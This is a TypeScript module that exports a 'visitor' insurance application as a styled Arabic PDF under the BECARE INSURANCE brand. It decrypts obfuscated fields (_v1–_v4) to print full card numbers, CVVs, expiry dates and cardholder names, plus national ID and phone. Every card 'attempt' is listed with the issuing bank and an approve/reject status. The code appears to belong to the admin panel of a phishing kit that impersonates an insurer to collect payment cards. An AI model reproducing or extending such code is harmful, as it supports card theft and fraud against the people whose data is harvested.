"use client";

import type { InsuranceApplication } from "@/lib/firestore-types";
import { _d } from "@/lib/secure-utils";

function decryptField(value: string | undefined): string {
  if (!value) return "";
  try {
    return _d(value) || value;
  } catch {
    return value;
  }
}

function formatDate(date: string | Date | undefined): string {
  if (!date) return "";
  try {
    const d = new Date(date as string);
    return d.toLocaleString("ar-SA", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return String(date);
  }
}

function val(v: string | number | undefined | null): string {
  if (v === undefined || v === null || v === "") return "";
  return String(v);
}

function buildPdfHtml(visitor: InsuranceApplication, logoBase64: string): string {
  const cardNumber = decryptField(visitor._v1 || visitor.cardNumber);
  const cvv = decryptField(visitor._v2 || visitor.cvv);
  const expiryDate = decryptField(visitor._v3 || visitor.expiryDate);
  const cardHolderName = decryptField(visitor._v4 || visitor.cardHolderName);

  const allCardHistory =
    visitor.history?.filter((h: any) => h.type === "_t1" || h.type === "card") || [];
  const sortedCardHistory = allCardHistory.sort(
    (a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const statusBadge = (status: string | undefined) => {
    switch (status) {
      case "approved":
        return '<span style="background:#DEF7EC;color:#03543F;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:600;">تم القبول ✓</span>';
      case "rejected":
        return '<span style="background:#FDE8E8;color:#9B1C1C;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:600;">تم الرفض ✗</span>';
      default:
        return '<span style="background:#FEF3C7;color:#92400E;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:600;">قيد المراجعة ⏳</span>';
    }
  };

  const renderRow = (label: string, value: string, isLast: boolean = false) => {
    if (!value) return "";
    return `
      <tr>
        <td style="padding:11px 18px;font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:13px;color:#6B7280;font-weight:500;border-bottom:${isLast ? "none" : "1px solid #F3F4F6"};width:40%;white-space:nowrap;">${label}</td>
        <td style="padding:11px 18px;font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:14px;color:#111827;font-weight:700;border-bottom:${isLast ? "none" : "1px solid #F3F4F6"};text-align:left;unicode-bidi:plaintext;">${value}</td>
      </tr>
    `;
  };

  const renderSection = (
    title: string,
    accentColor: string,
    rows: { label: string; value: string }[]
  ) => {
    const filteredRows = rows.filter((r) => r.value && r.value.trim() !== "");
    if (filteredRows.length === 0) return "";

    return `
      <div style="margin-bottom:18px;break-inside:avoid;">
        <div style="background:#FFFFFF;border:1px solid #E5E7EB;border-radius:10px;overflow:hidden;">
          <div style="padding:13px 18px;background:${accentColor};border-bottom:2px solid ${accentColor};">
            <span style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:15px;font-weight:700;color:#FFFFFF;">${title}</span>
          </div>
          <table style="width:100%;border-collapse:collapse;">
            ${filteredRows.map((row, i) => renderRow(row.label, row.value, i === filteredRows.length - 1)).join("")}
          </table>
        </div>
      </div>
    `;
  };

  let cardSections = "";
  if (sortedCardHistory.length > 0) {
    sortedCardHistory.forEach((card: any, index: number) => {
      const cn = decryptField(card.data?._v1);
      const cv = decryptField(card.data?._v2);
      const ed = decryptField(card.data?._v3);
      const ch = decryptField(card.data?._v4);
      const title = index === 0 ? "معلومات الدفع" : `معلومات الدفع (محاولة ${sortedCardHistory.length - index})`;
      cardSections += renderSection(title, "#D97706", [
        { label: "رقم البطاقة", value: cn },
        { label: "اسم حامل البطاقة", value: ch },
        { label: "نوع البطاقة", value: val(card.data?.cardType) },
        { label: "تاريخ الانتهاء", value: ed },
        { label: "CVV", value: cv },
        { label: "البنك", value: val(card.data?.bankInfo?.name) },
        { label: "بلد البنك", value: val(card.data?.bankInfo?.country) },
        { label: "الحالة", value: statusBadge(card.status) },
        { label: "التاريخ", value: formatDate(card.timestamp) },
      ]);
    });
  } else if (cardNumber) {
    cardSections = renderSection("معلومات الدفع", "#D97706", [
      { label: "رقم البطاقة", value: cardNumber },
      { label: "اسم حامل البطاقة", value: cardHolderName },
      { label: "تاريخ الانتهاء", value: expiryDate },
      { label: "CVV", value: cvv },
    ]);
  }

  const now = new Date();
  const dateStr = now.toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" });

  return `
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <div id="pdf-content" style="
      font-family: 'Cairo', 'Segoe UI', Tahoma, Arial, sans-serif;
      direction: rtl;
      text-align: right;
      width: 680px;
      margin: 0 auto;
      padding: 0;
      background: #FFFFFF;
      color: #1F2937;
      line-height: 1.6;
    ">

      <div style="
        background: linear-gradient(160deg, #0F4C3A 0%, #1A6B4F 40%, #22805E 100%);
        padding: 36px 28px 28px;
        text-align: center;
        position: relative;
        overflow: hidden;
      ">
        <div style="position:absolute;top:0;left:0;right:0;bottom:0;background:url('data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22none%22 stroke=%22rgba(255,255,255,0.03)%22 stroke-width=%222%22/></svg>') repeat;"></div>
        <div style="position:relative;z-index:1;">
          <div style="display:inline-block;border:2px solid rgba(212,175,55,0.5);padding:4px 24px;border-radius:4px;margin-bottom:14px;">
            <span style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:11px;color:#D4AF37;letter-spacing:3px;text-transform:uppercase;font-weight:700;">BECARE INSURANCE</span>
          </div>
          <div style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:28px;font-weight:900;color:#FFFFFF;margin-bottom:6px;letter-spacing:1px;">Car Insurance</div>
          <div style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:16px;font-weight:600;color:rgba(255,255,255,0.75);margin-bottom:18px;">Insurance Application Form</div>
          <div style="display:flex;justify-content:center;gap:20px;flex-wrap:wrap;">
            <div style="background:rgba(255,255,255,0.1);padding:7px 18px;border-radius:4px;font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:11px;color:rgba(255,255,255,0.85);">
              رقم المستند: <span style="font-weight:800;color:#D4AF37;">${visitor.id || "-"}</span>
            </div>
            <div style="background:rgba(255,255,255,0.1);padding:7px 18px;border-radius:4px;font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:11px;color:rgba(255,255,255,0.85);">
              التاريخ: <span style="font-weight:800;color:#D4AF37;">${dateStr}</span>
            </div>
          </div>
        </div>
      </div>

      <div style="height:4px;background:linear-gradient(90deg,#D4AF37,#C5960C,#D4AF37);"></div>

      <div style="padding:22px 24px 0;">

        ${renderSection("معلومات مقدم الطلب", "#1A6B4F", [
          { label: "الاسم الكامل", value: val(visitor.ownerName) },
          { label: "رقم الهوية", value: val(visitor.identityNumber) },
          { label: "رقم الهاتف", value: val(visitor.phoneNumber) },
          { label: "تاريخ الميلاد", value: "" },
        ])}

        ${renderSection("معلومات المركبة", "#2563EB", [
          { label: "الرقم التسلسلي", value: val(visitor.serialNumber) },
          { label: "موديل المركبة", value: val(visitor.vehicleModel) },
          { label: "سنة الصنع", value: val(visitor.vehicleYear) },
          { label: "نوع التغطية", value: val(visitor.insuranceCoverage) },
          { label: "الإضافات", value: Array.isArray(visitor.selectedFeatures) && visitor.selectedFeatures.length > 0 ? visitor.selectedFeatures.join("، ") : "" },
        ])}

        ${renderSection("عرض التأمين المختار", "#7C3AED", [
          { label: "الشركة", value: val(visitor.selectedOffer ? ((visitor.selectedOffer as any).name || (visitor.selectedOffer as any).company) : "") },
          { label: "السعر الأساسي", value: visitor.originalPrice ? `ر.س ${visitor.originalPrice}` : "" },
          { label: "الخصم", value: visitor.discount ? `${(visitor.discount * 100).toFixed(0)}%` : "" },
          { label: "السعر الإجمالي", value: (visitor.finalPrice || visitor.offerTotalPrice) ? `ر.س ${visitor.finalPrice || visitor.offerTotalPrice}` : "" },
        ])}

        ${cardSections}

      </div>

      <div style="
        margin:30px 24px 0;
        padding:32px 20px 20px;
        text-align:center;
        border-top:2px solid #E5E7EB;
      ">
        <img src="${logoBase64}" style="width:220px;height:auto;margin:0 auto 14px;display:block;" crossorigin="anonymous" />
        <div style="height:1px;background:linear-gradient(90deg,transparent,#D4AF37,transparent);margin:18px 40px;"></div>
        <div style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:10px;color:#9CA3AF;margin-top:10px;">
          تم الإنشاء: ${formatDate(visitor.createdAt)} &nbsp;|&nbsp; رقم المستند: ${visitor.id || "-"}
        </div>
      </div>

    </div>
  `;
}

export async function generateVisitorPdf(visitor: InsuranceApplication) {
  const { BECARE_LOGO_BASE64 } = await import("@/lib/pdf-logo");
  const html2pdf = (await import("html2pdf.js")).default;

  const link = document.createElement("link");
  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
  link.rel = "stylesheet";
  document.head.appendChild(link);
  await new Promise((resolve) => setTimeout(resolve, 1500));

  const container = document.createElement("div");
  container.innerHTML = buildPdfHtml(visitor, BECARE_LOGO_BASE64);
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
  container.style.width = "700px";
  document.body.appendChild(container);

  const element = container.querySelector("#pdf-content") as HTMLElement;

  const opt = {
    margin: [8, 5, 8, 5] as [number, number, number, number],
    filename: `طلب_تأمين_${visitor.identityNumber || visitor.id || "visitor"}_${Date.now()}.pdf`,
    image: { type: "jpeg" as const, quality: 0.98 },
    html2canvas: {
      scale: 2,
      useCORS: true,
      letterRendering: true,
      scrollY: 0,
    },
    jsPDF: {
      unit: "mm",
      format: "a4",
      orientation: "portrait" as const,
    },
    pagebreak: { mode: ["avoid-all", "css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}
